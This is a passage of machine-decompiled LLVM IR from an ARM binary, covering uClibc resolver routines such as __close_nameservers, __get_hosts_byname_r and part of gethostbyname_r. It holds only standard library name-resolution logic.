  %storemerge = phi i32 [ 1130, %dec_label_pc_1df08 ], [ 1131, %dec_label_pc_1df28 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_1df44 = load i32, i32* @r6, align 4
  %v1_1df44 = add i32 %v0_1df44, 1
  store i32 %v1_1df44, i32* @r0, align 4
  %v0_1df48 = load i32, i32* @r5, align 4
  %v2_1df48 = add i32 %v0_1df48, %storemerge
  store i32 %v2_1df48, i32* @r4, align 4
  %v1_1df4c = call i32 @atol(i32 %v1_1df44)
  %v2_1df4c = trunc i32 %v1_1df4c to i8
  store i32 %v1_1df4c, i32* %r0.global-to-local, align 4
  %v3_1df50 = load i32, i32* @r4, align 4
  %v4_1df50 = inttoptr i32 %v3_1df50 to i8*
  store i8 %v2_1df4c, i8* %v4_1df50, align 1
  br label %dec_label_pc_1df8c.backedge

dec_label_pc_1df58:                               ; preds = %dec_label_pc_1dcf8
  %v0_1df5c = load i32, i32* @r5, align 4
  %v2_1df5c = add i32 %v0_1df5c, -32932
  %v2_1df68 = add i32 %v0_1df5c, -32920
  %v2_1df74 = add i32 %v0_1df5c, -32912
  %v2_1df80 = add i32 %v0_1df5c, -32904
  store i32 %v2_1df80, i32* %r3.global-to-local, align 4
  store i32 27364, i32* @sb, align 4
  store i32 %v2_1df80, i32* %stack_var_-560, align 4
  %v2_1df8c = ptrtoint i32* %stack_var_-288 to i32
  %v1_1dd34 = bitcast i32* %stack_var_-288 to i8*
  %v2_1dd64 = ptrtoint i16* %stack_var_-68 to i32
  %v2_1dd78 = bitcast i16* %stack_var_-68 to i8*
  %v2_1dd84 = ptrtoint i32* %stack_var_-60 to i32
  %v2_1dd9c = ptrtoint i32* %stack_var_-64 to i32
  %v2_1ddb4 = ptrtoint i32* %stack_var_-304 to i32
  %v14_1ddf8 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_1df8c, i32* @r4, align 4
  store i32 %v2_1df8c, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v5_1dd20, i32* %r2.global-to-local, align 4
  %v3_1df9c66 = call i32 @fgets(i32 %v2_1df8c, i32 128, i32 %v5_1dd20)
  store i32 %v3_1df9c66, i32* %r0.global-to-local, align 4
  %v2_1dfa068 = icmp eq i32 %v3_1df9c66, 0
  br i1 %v2_1dfa068, label %dec_label_pc_1dfa8, label %dec_label_pc_1dd30

dec_label_pc_1dfa8:                               ; preds = %dec_label_pc_1df8c.backedge, %dec_label_pc_1df58
  %v0_1dfa8 = load i32, i32* @fp, align 4
  store i32 %v0_1dfa8, i32* %r0.global-to-local, align 4
  %v1_1dfac = inttoptr i32 %v0_1dfa8 to i16*
  %v2_1dfac = call i32 @__GI_fclose(i16* %v1_1dfac)
  store i32 %v2_1dfac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1dfb0

dec_label_pc_1dfb0:                               ; preds = %dec_label_pc_1dcf8, %dec_label_pc_1dfa8
  store i32 27360, i32* %r3.global-to-local, align 4
  %v0_1dfb4 = load i32, i32* @r5, align 4
  %v2_1dfb4 = add i32 %v0_1dfb4, 27360
  %v3_1dfb4 = inttoptr i32 %v2_1dfb4 to i32*
  %v4_1dfb4 = load i32, i32* %v3_1dfb4, align 4
  store i32 %v4_1dfb4, i32* %r3.global-to-local, align 4
  %v2_1dfb8 = icmp eq i32 %v4_1dfb4, 0
  br i1 %v2_1dfb8, label %dec_label_pc_1dfc0, label %dec_label_pc_1dffc

dec_label_pc_1dfc0:                               ; preds = %dec_label_pc_1dfb0
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_1dfc4 = call i32 @malloc(i32 28)
  store i32 %v1_1dfc4, i32* %r0.global-to-local, align 4
  store i32 -32876, i32* %r3.global-to-local, align 4
  store i32 27356, i32* %r2.global-to-local, align 4
  %v2_1dfd0 = icmp eq i32 %v1_1dfc4, 0
  %v1_1dfd4 = load i32, i32* @r5, align 4
  br i1 %v2_1dfd0, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_1dfc0
  %v3_1dfd4 = add i32 %v1_1dfd4, -32876
  store i32 %v3_1dfd4, i32* %r3.global-to-local, align 4
  %v3_1dfd828 = add i32 %v1_1dfd4, 27356
  %v4_1dfd829 = inttoptr i32 %v3_1dfd828 to i32*
  store i32 0, i32* %v4_1dfd829, align 4
  %v1_1dfdc = load i32, i32* %r3.global-to-local, align 4
  %v2_1dfdc = load i32, i32* @r5, align 4
  %v3_1dfdc = load i32, i32* %r2.global-to-local, align 4
  %v4_1dfdc = add i32 %v3_1dfdc, %v2_1dfdc
  %v5_1dfdc = inttoptr i32 %v4_1dfdc to i32*
  store i32 %v1_1dfdc, i32* %v5_1dfdc, align 4
  br label %.thread4

bb63:                                             ; preds = %dec_label_pc_1dfc0
  %v3_1dfd8 = add i32 %v1_1dfd4, 27356
  %v4_1dfd8 = inttoptr i32 %v3_1dfd8 to i32*
  store i32 %v1_1dfc4, i32* %v4_1dfd8, align 4
  %v1_1dfe0 = load i32, i32* @r5, align 4
  %v2_1dfe0 = load i32, i32* %r3.global-to-local, align 4
  %v3_1dfe0 = add i32 %v2_1dfe0, %v1_1dfe0
  store i32 %v3_1dfe0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %bb62, %bb63
  store i32 122860, i32* @lr, align 4
  %v1_1dfe8 = xor i1 %v2_1dfd0, true
  call void @__pseudo_cond_branch(i1 %v1_1dfe8, i32 ptrtoint (i32* @global_var_15a40.1075 to i32))
  store i32 27360, i32* %r2.global-to-local, align 4
  %v0_1dff0 = load i32, i32* @r5, align 4
  %v2_1dff0 = add i32 %v0_1dff0, 27360
  %v3_1dff0 = inttoptr i32 %v2_1dff0 to i32*
  %v4_1dff0 = load i32, i32* %v3_1dff0, align 4
  %v1_1dff4 = add i32 %v4_1dff0, 1
  store i32 %v1_1dff4, i32* %r3.global-to-local, align 4
  store i32 %v1_1dff4, i32* %v3_1dff0, align 4
  %v0_1e000.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1dffc

dec_label_pc_1dffc:                               ; preds = %dec_label_pc_1dfb0, %.thread4
  %v0_1e000 = phi i32 [ %v0_1dfb4, %dec_label_pc_1dfb0 ], [ %v0_1e000.pre, %.thread4 ]
  store i32 27364, i32* @r7, align 4
  %v2_1e000 = add i32 %v0_1e000, 27364
  %v3_1e000 = inttoptr i32 %v2_1e000 to i32*
  %v4_1e000 = load i32, i32* %v3_1e000, align 4
  store i32 %v4_1e000, i32* @r4, align 4
  %v2_1e004 = icmp eq i32 %v4_1e000, 0
  br i1 %v2_1e004, label %dec_label_pc_1e00c, label %dec_label_pc_1e08c

dec_label_pc_1e00c:                               ; preds = %dec_label_pc_1dffc
  %v2_1e00c = ptrtoint i32* %stack_var_-544 to i32
  store i32 %v2_1e00c, i32* @r6, align 4
  store i32 %v2_1e00c, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_1e018 = call i32 @__GI_gethostname(i32 %v2_1e00c, i32 255)
  store i32 %v2_1e018, i32* %r0.global-to-local, align 4
  %v2_1e01c = icmp eq i32 %v2_1e018, 0
  br i1 %v2_1e01c, label %dec_label_pc_1e028, label %dec_label_pc_1e08c

dec_label_pc_1e028:                               ; preds = %dec_label_pc_1e00c
  store i32 %v2_1e00c, i32* @r0, align 4
  store i32 46, i32* %r1.global-to-local, align 4
  %v2_1e030 = call i32 @__GI_strchr(i32 %v2_1e00c, i32 46)
  store i32 %v2_1e030, i32* %r0.global-to-local, align 4
  %v2_1e034 = icmp eq i32 %v2_1e030, 0
  br i1 %v2_1e034, label %dec_label_pc_1e08c, label %dec_label_pc_1e03c

dec_label_pc_1e03c:                               ; preds = %dec_label_pc_1e028
  %v1_1e03c = add i32 %v2_1e030, 1
  %v2_1e03c = inttoptr i32 %v1_1e03c to i8*
  %v3_1e03c = load i8, i8* %v2_1e03c, align 1
  %v4_1e03c = zext i8 %v3_1e03c to i32
  store i32 %v4_1e03c, i32* %r3.global-to-local, align 4
  %v2_1e040 = icmp eq i8 %v3_1e03c, 0
  store i32 %v1_1e03c, i32* %r0.global-to-local, align 4
  br i1 %v2_1e040, label %dec_label_pc_1e08c, label %dec_label_pc_1e04c

dec_label_pc_1e04c:                               ; preds = %dec_label_pc_1e03c
  %v2_1e04c = call i32 @__GI_strdup(i8* %v2_1e03c)
  store i32 %v2_1e04c, i32* %r0.global-to-local, align 4
  store i32 %v2_1e04c, i32* @r4, align 4
  %v2_1e050 = icmp eq i32 %v2_1e04c, 0
  br i1 %v2_1e050, label %dec_label_pc_1e08c, label %dec_label_pc_1e058

dec_label_pc_1e058:                               ; preds = %dec_label_pc_1e04c
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1e05c = call i32 @malloc(i32 4)
  store i32 %v1_1e05c, i32* %r0.global-to-local, align 4
  store i32 27352, i32* %r3.global-to-local, align 4
  %v2_1e064 = icmp eq i32 %v1_1e05c, 0
  %v1_1e068 = load i32, i32* @r5, align 4
  %v3_1e068 = add i32 %v1_1e068, 27352
  %v4_1e068 = inttoptr i32 %v3_1e068 to i32*
  store i32 %v1_1e05c, i32* %v4_1e068, align 4
  br i1 %v2_1e064, label %dec_label_pc_1e070, label %dec_label_pc_1e07c

dec_label_pc_1e070:                               ; preds = %dec_label_pc_1e058
  %v0_1e070 = load i32, i32* @r4, align 4
  store i32 %v0_1e070, i32* @r0, align 4
  %v0_1e074 = call i32 @free()
  store i32 %v0_1e074, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1e08c

dec_label_pc_1e07c:                               ; preds = %dec_label_pc_1e058
  %v0_1e07c = load i32, i32* @r5, align 4
  %v1_1e07c = load i32, i32* @r7, align 4
  %v2_1e07c = add i32 %v1_1e07c, %v0_1e07c
  %v3_1e07c = inttoptr i32 %v2_1e07c to i32*
  %v4_1e07c = load i32, i32* %v3_1e07c, align 4
  %v1_1e080 = add i32 %v4_1e07c, 1
  store i32 %v1_1e080, i32* %r3.global-to-local, align 4
  %v0_1e084 = load i32, i32* @r4, align 4
  %v2_1e084 = inttoptr i32 %v1_1e05c to i32*
  store i32 %v0_1e084, i32* %v2_1e084, align 4
  %v0_1e088 = load i32, i32* %r3.global-to-local, align 4
  %v1_1e088 = load i32, i32* @r5, align 4
  %v2_1e088 = load i32, i32* @r7, align 4
  %v3_1e088 = add i32 %v2_1e088, %v1_1e088
  %v4_1e088 = inttoptr i32 %v3_1e088 to i32*
  store i32 %v0_1e088, i32* %v4_1e088, align 4
  br label %dec_label_pc_1e08c

dec_label_pc_1e08c:                               ; preds = %dec_label_pc_1e00c, %dec_label_pc_1dffc, %dec_label_pc_1dce8, %dec_label_pc_1e04c, %dec_label_pc_1e03c, %dec_label_pc_1e028, %dec_label_pc_1e070, %dec_label_pc_1e07c
  store i32 27348, i32* %r3.global-to-local, align 4
  %v0_1e090 = load i32, i32* @r5, align 4
  %v2_1e090 = add i32 %v0_1e090, 27348
  %v3_1e090 = inttoptr i32 %v2_1e090 to i32*
  %v4_1e090 = load i32, i32* %v3_1e090, align 4
  store i32 %v4_1e090, i32* %r0.global-to-local, align 4
  %v2_1e094 = icmp eq i32 %v4_1e090, 0
  br i1 %v2_1e094, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_1e08c
  store i32 123040, i32* %lr.global-to-local, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_1e08c, %bb64
  %v2_1e09c = xor i1 %v2_1e094, true
  call void @__pseudo_cond_branch(i1 %v2_1e09c, i32 %v4_1e090)
  %v2_1e0a4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1e0a4, i32* %r4.global-to-local, align 4
  store i32 %v15_1dc98, i32* @r8, align 4
  store i32 %v18_1dc98, i32* @sb, align 4
  store i32 %v21_1dc98, i32* @sl, align 4
  store i32 %v24_1dc98, i32* @fp, align 4
  store i32 %v27_1dc98, i32* %lr.global-to-local, align 4
  ret i32 %v4_1e090

; uselistorder directives
  uselistorder i32 %v4_1e090, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1e00c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_1dd9c, { 1, 0 }
  uselistorder i32 %v2_1dd84, { 1, 0 }
  uselistorder i32 %v2_1dd64, { 1, 0 }
  uselistorder i32 %v2_1df8c, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 %v0_1df5c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1df4c, { 1, 0 }
  uselistorder i32 %v0_1deec, { 1, 0, 2 }
  uselistorder i32 %v1_1de6417, { 1, 0 }
  uselistorder i32 %v1_1de5c10, { 1, 0 }
  uselistorder i32 %v0_1de5c9, { 1, 0 }
  uselistorder i32 %v1_1de64, { 1, 0 }
  uselistorder i32 %v3_1dde0, { 1, 0, 2, 3, 4 }
  uselistorder i16* %stack_var_-68, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 9, 7, 8, 10, 11, 12, 22, 0, 13, 14, 15, 28, 18, 16, 17, 19, 20, 21, 23, 24, 25, 26, 27 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 1, 6, 0, 8, 7, 15, 9, 10, 11, 12, 13, 14, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 17, 10, 11, 12, 13, 14, 15, 16, 18, 19, 20, 21 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 7, 6, 8, 10, 9, 12, 11, 14, 13, 1, 0, 15, 17, 16, 19, 18, 20, 22, 21, 24, 23, 25, 26, 28, 27, 29, 31, 30, 36, 35, 51, 50, 32, 33, 34, 38, 37, 40, 39, 41, 43, 42, 44, 46, 45, 47, 49, 48, 54, 52, 53, 56, 55 }
  uselistorder i32 (i16*)* @__GI_fclose, { 1, 0 }
  uselistorder i32 (i32)* @atol, { 0, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 58, { 0, 6, 4, 7, 1, 2, 3, 5 }
  uselistorder i32 (i32*, i32)* @realloc, { 1, 2, 0 }
  uselistorder i16 2, { 1, 0, 2, 3 }
  uselistorder i32 (i8*, i32)* @__GI_memset, { 33, 35, 36, 4, 37, 32, 5, 6, 31, 38, 44, 29, 30, 48, 47, 34, 0, 40, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 39, 19, 20, 21, 22, 1, 2, 3, 23, 24, 25, 26, 27, 28, 41, 42, 43, 45, 46 }
  uselistorder i32 ()* @skip_nospace, { 2, 1, 0 }
  uselistorder i8 3, { 0, 4, 3, 1, 2, 5 }
  uselistorder i32 -33924, { 1, 0 }
  uselistorder i32 1131, { 0, 3, 4, 5, 2, 1 }
  uselistorder i32 -32952, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -32952), { 1, 0 }
  uselistorder i32 27348, { 0, 2, 1, 3 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_1e08c, { 7, 6, 3, 4, 5, 0, 1, 2 }
  uselistorder label %dec_label_pc_1dffc, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1dfb0, { 1, 0 }
  uselistorder label %dec_label_pc_1dfa8, { 1, 0 }
  uselistorder label %dec_label_pc_1de6c, { 1, 0 }
  uselistorder label %dec_label_pc_1df8c.backedge, { 4, 10, 8, 7, 9, 0, 1, 2, 3, 6, 5 }
  uselistorder label %dec_label_pc_1dce8, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
}

define i32 @__close_nameservers() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1e0f4 = load i32, i32* @r4, align 4
  store i32 %v3_1e0f4, i32* %stack_var_-20, align 4
  store i32 27356, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r5, align 4
  store i32 -32876, i32* %r3.global-to-local, align 4
  %v4_1e108 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 27356) to i32*), align 4
  store i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -32876), i32* %r3.global-to-local, align 4
  store i32 123164, i32* @lr, align 4
  %v1_1e118 = icmp ne i32 %v4_1e108, add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -32876)
  call void @__pseudo_cond_branch(i1 %v1_1e118, i32 ptrtoint (i32* @global_var_17268.1116 to i32))
  store i32 27360, i32* %r3.global-to-local, align 4
  store i32 27364, i32* @r7, align 4
  store i32 27352, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_1e12c = load i32, i32* @r5, align 4
  %v3_1e12c = add i32 %v1_1e12c, 27360
  %v4_1e12c = inttoptr i32 %v3_1e12c to i32*
  store i32 0, i32* %v4_1e12c, align 4
  %v0_1e130 = load i32, i32* %r2.global-to-local, align 4
  %v1_1e130 = load i32, i32* @r5, align 4
  %v2_1e130 = load i32, i32* %r4.global-to-local, align 4
  %v3_1e130 = add i32 %v2_1e130, %v1_1e130
  %v4_1e130 = inttoptr i32 %v3_1e130 to i32*
  store i32 %v0_1e130, i32* %v4_1e130, align 4
  br label %dec_label_pc_1e148

dec_label_pc_1e138:                               ; preds = %dec_label_pc_1e148
  store i32 %v4_1e15c, i32* %r3.global-to-local, align 4
  store i32 %v1_1e150, i32* %v3_1e148, align 4
  %v0_1e140 = load i32, i32* %r3.global-to-local, align 4
  %v1_1e140 = load i32, i32* %r2.global-to-local, align 4
  %v4_1e140 = mul i32 %v1_1e140, 4
  %v5_1e140 = add i32 %v4_1e140, %v0_1e140
  %v6_1e140 = inttoptr i32 %v5_1e140 to i32*
  %v7_1e140 = load i32, i32* %v6_1e140, align 4
  store i32 %v7_1e140, i32* @r0, align 4
  %v0_1e144 = call i32 @free()
  br label %dec_label_pc_1e148

dec_label_pc_1e148:                               ; preds = %entry, %dec_label_pc_1e138
  %v0_1e148 = load i32, i32* @r5, align 4
  %v1_1e148 = load i32, i32* @r7, align 4
  %v2_1e148 = add i32 %v1_1e148, %v0_1e148
  %v3_1e148 = inttoptr i32 %v2_1e148 to i32*
  %v4_1e148 = load i32, i32* %v3_1e148, align 4
  store i32 %v4_1e148, i32* @r4, align 4
  %v2_1e14c = icmp eq i32 %v4_1e148, 0
  %v1_1e150 = add i32 %v4_1e148, -1
  store i32 %v1_1e150, i32* %r2.global-to-local, align 4
  %v0_1e154 = load i32, i32* @r6, align 4
  store i32 %v0_1e154, i32* %r3.global-to-local, align 4
  %v2_1e15c = add i32 %v0_1e154, %v0_1e148
  %v3_1e15c = inttoptr i32 %v2_1e15c to i32*
  %v4_1e15c = load i32, i32* %v3_1e15c, align 4
  br i1 %v2_1e14c, label %dec_label_pc_1e15c, label %dec_label_pc_1e138

dec_label_pc_1e15c:                               ; preds = %dec_label_pc_1e148
  store i32 %v4_1e15c, i32* @r0, align 4
  %v0_1e160 = call i32 @free()
  %v0_1e164 = load i32, i32* @r4, align 4
  %v1_1e164 = load i32, i32* @r5, align 4
  %v2_1e164 = load i32, i32* @r6, align 4
  %v3_1e164 = add i32 %v2_1e164, %v1_1e164
  %v4_1e164 = inttoptr i32 %v3_1e164 to i32*
  store i32 %v0_1e164, i32* %v4_1e164, align 4
  %v2_1e16c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1e16c, i32* %r4.global-to-local, align 4
  ret i32 %v0_1e160

; uselistorder directives
  uselistorder i32 %v4_1e15c, { 1, 0 }
  uselistorder i32 %v1_1e150, { 1, 0 }
  uselistorder i32* %v3_1e148, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 27352, { 4, 1, 7, 5, 6, 0, 3, 2, 8 }
  uselistorder i32 27364, { 1, 2, 4, 3, 0 }
  uselistorder i32 27360, { 0, 1, 3, 7, 4, 8, 2, 6, 5, 9, 10, 12, 11, 13 }
  uselistorder i32 -32876, { 1, 2, 0, 3 }
  uselistorder i32 27356, { 4, 5, 1, 0, 7, 2, 6, 3, 8 }
  uselistorder label %dec_label_pc_1e148, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v0_1e18c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_1e1c8 = call i32 @__read_etc_hosts_r()
  store i32 %v0_1e18c, i32* @lr, align 4
  ret i32 %v0_1e1c8
}

define i32 @gethostbyname_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp29, i32* %stack_var_0, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_1e1e0 = load i32, i32* @r2, align 4
  store i32 %tmp29, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_1e1ec = load i32, i32* @r0, align 4
  store i32 %v0_1e1ec, i32* @sl, align 4
  %v2_1e1ec = icmp eq i32 %v0_1e1ec, 0
  %v2_1e1f0 = inttoptr i32 %tmp29 to i32*
  store i32 0, i32* %v2_1e1f0, align 4
  %v0_1e1f4 = load i32, i32* @r1, align 4
  store i32 %v0_1e1f4, i32* @r7, align 4
  %v0_1e1f8 = load i32, i32* @r3, align 4
  store i32 %v0_1e1f8, i32* @r6, align 4
  br i1 %v2_1e1ec, label %bb, label %dec_label_pc_1e204

bb:                                               ; preds = %entry
  %v1_1e1fc = load i32, i32* @r5, align 4
  %v2_1e1fc = add i32 %v1_1e1fc, 22
  store i32 %v2_1e1fc, i32* @r5, align 4
  br label %dec_label_pc_1e4c0

dec_label_pc_1e204:                               ; preds = %entry
  %v0_1e204 = call i32 @__GI___errno_location()
  store i32 %v0_1e204, i32* %r0.global-to-local, align 4
  %v3_1e208 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1e208, i32* %ip.global-to-local, align 4
  %v1_1e20c = inttoptr i32 %v0_1e204 to i32*
  %v2_1e20c = load i32, i32* %v1_1e20c, align 4
  store i32 %v2_1e20c, i32* @r8, align 4
  %v0_1e210 = load i32, i32* @r5, align 4
  store i32 %v0_1e210, i32* %v1_1e20c, align 4
  %v0_1e214 = load i32, i32* %ip.global-to-local, align 4
  store i32 %tmp18, i32* %ip.global-to-local, align 4
  store i32 %v0_1e204, i32* @r4, align 4
  %v0_1e224 = load i32, i32* @sl, align 4
  store i32 %v0_1e224, i32* %r0.global-to-local, align 4
  %v0_1e228 = load i32, i32* @r7, align 4
  store i32 %v0_1e228, i32* %r2.global-to-local, align 4
  store i32 %v0_1e1e0, i32* %r3.global-to-local, align 4
  %v0_1e230 = load i32, i32* @r6, align 4
  %v7_1e238 = call i32 @__get_hosts_byname_r(i32 %v0_1e224, i32 2, i32 %v0_1e228, i32 %v0_1e1e0, i32 %v0_1e230, i32 %v0_1e214, i32 %tmp18)
  store i32 %v7_1e238, i32* %r0.global-to-local, align 4
  store i32 %v7_1e238, i32* @r5, align 4
  %v2_1e23c = icmp eq i32 %v7_1e238, 0
  br i1 %v2_1e23c, label %bb34, label %dec_label_pc_1e248

bb34:                                             ; preds = %dec_label_pc_1e204
  %v1_1e240 = load i32, i32* @r8, align 4
  %v2_1e240 = load i32, i32* @r4, align 4
  %v3_1e240 = inttoptr i32 %v2_1e240 to i32*
  store i32 %v1_1e240, i32* %v3_1e240, align 4
  br label %dec_label_pc_1e4c0

dec_label_pc_1e248:                               ; preds = %dec_label_pc_1e204
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v1_1e24c = inttoptr i32 %tmp18 to i32*
  %v2_1e24c = load i32, i32* %v1_1e24c, align 4
  store i32 %v2_1e24c, i32* %r3.global-to-local, align 4
  %v7_1e250 = icmp eq i32 %v2_1e24c, 1
  br i1 %v7_1e250, label %dec_label_pc_1e26c, label %dec_label_pc_1e258

dec_label_pc_1e258:                               ; preds = %dec_label_pc_1e248
  %v7_1e258 = icmp eq i32 %v2_1e24c, 4
  br i1 %v7_1e258, label %dec_label_pc_1e28c, label %dec_label_pc_1e260

dec_label_pc_1e260:                               ; preds = %dec_label_pc_1e258
  %v3_1e260 = icmp eq i32 %v2_1e24c, -1
  br i1 %v3_1e260, label %dec_label_pc_1e280, label %dec_label_pc_1e4c0

dec_label_pc_1e26c:                               ; preds = %dec_label_pc_1e248
  %v7_1e26c = icmp eq i32 %v7_1e238, 2
  br i1 %v7_1e26c, label %.thread4, label %bb35

bb35:                                             ; preds = %dec_label_pc_1e26c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1e294

.thread4:                                         ; preds = %dec_label_pc_1e26c
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1e294

dec_label_pc_1e280:                               ; preds = %dec_label_pc_1e260
  %v0_1e280 = load i32, i32* @r4, align 4
  %v1_1e280 = inttoptr i32 %v0_1e280 to i32*
  %v2_1e280 = load i32, i32* %v1_1e280, align 4
  store i32 %v2_1e280, i32* %r3.global-to-local, align 4
  %v7_1e284 = icmp eq i32 %v2_1e280, 2
  br i1 %v7_1e284, label %dec_label_pc_1e28c, label %dec_label_pc_1e4c0

dec_label_pc_1e28c:                               ; preds = %dec_label_pc_1e280, %dec_label_pc_1e258
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1e294

dec_label_pc_1e294:                               ; preds = %.thread4, %bb35, %dec_label_pc_1e28c
  %storemerge2 = phi i32 [ 0, %dec_label_pc_1e28c ], [ 0, %bb35 ], [ 1, %.thread4 ]
  store i32 %tmp18, i32* @ip, align 4
  store i32 -1, i32* @r3, align 4
  %v0_1e29c = load i32, i32* @r8, align 4
  %v1_1e29c = load i32, i32* @r4, align 4
  %v2_1e29c = inttoptr i32 %v1_1e29c to i32*
  store i32 %v0_1e29c, i32* %v2_1e29c, align 4
  %v0_1e2a0 = load i32, i32* @sl, align 4
  %v1_1e2a0 = inttoptr i32 %v0_1e2a0 to i8*
  store i32 %v0_1e2a0, i32* %r0.global-to-local, align 4
  %v0_1e2a4 = load i32, i32* @r3, align 4
  %v1_1e2a4 = load i32, i32* @ip, align 4
  %v2_1e2a4 = inttoptr i32 %v1_1e2a4 to i32*
  store i32 %v0_1e2a4, i32* %v2_1e2a4, align 4
  %v3_1e2a8 = call i32 @strlen(i8* %v1_1e2a0)
  store i32 %v3_1e2a8, i32* %r0.global-to-local, align 4
  %v1_1e2ac = add i32 %v3_1e2a8, 1
  store i32 %v1_1e2ac, i32* @r4, align 4
  %v0_1e2b0 = load i32, i32* @r6, align 4
  %v7_1e2b4 = icmp sgt i32 %v0_1e2b0, %v1_1e2ac
  br i1 %v7_1e2b4, label %dec_label_pc_1e2b8, label %dec_label_pc_1e4bc

dec_label_pc_1e2b8:                               ; preds = %dec_label_pc_1e294
  %v0_1e2b8 = load i32, i32* @sl, align 4
  store i32 %v0_1e2b8, i32* @r1, align 4
  store i32 %v1_1e2ac, i32* @r2, align 4
  store i32 %v0_1e1e0, i32* @r0, align 4
  %v0_1e2c4 = call i32 @memcpy()
  store i32 %v0_1e2c4, i32* %r0.global-to-local, align 4
  %v1_1e2cc = load i32, i32* @r4, align 4
  %v2_1e2cc = add i32 %v1_1e2cc, %v0_1e1e0
  %v1_1e2d0 = sub i32 0, %v2_1e2cc
  %v1_1e2d4 = load i32, i32* @r6, align 4
  %v2_1e2d4 = sub i32 %v1_1e2d4, %v1_1e2cc
  store i32 %v2_1e2d4, i32* %r2.global-to-local, align 4
  %v1_1e2d8 = urem i32 %v1_1e2d0, 4
  store i32 %v1_1e2d8, i32* %r3.global-to-local, align 4
  %v2_1e2dc = sub i32 %v2_1e2d4, %v1_1e2d8
  store i32 %v2_1e2dc, i32* @sb, align 4
  %v1_1e2e0 = add i32 %v2_1e2dc, -8
  store i32 %v1_1e2e0, i32* @r5, align 4
  %v7_1e2e8 = icmp slt i32 %v1_1e2e0, 256
  br i1 %v7_1e2e8, label %dec_label_pc_1e4bc, label %dec_label_pc_1e2ec

dec_label_pc_1e2ec:                               ; preds = %dec_label_pc_1e2b8
  %v2_1e2ec = add i32 %v1_1e2d8, %v2_1e2cc
  store i32 %v2_1e2ec, i32* @fp, align 4
  store i32 %v0_1e1e0, i32* %ip.global-to-local, align 4
  %v1_1e2f4 = add i32 %v2_1e2ec, 8
  store i32 %v1_1e2f4, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  %v1_1e2fc = add i32 %v2_1e2ec, 16
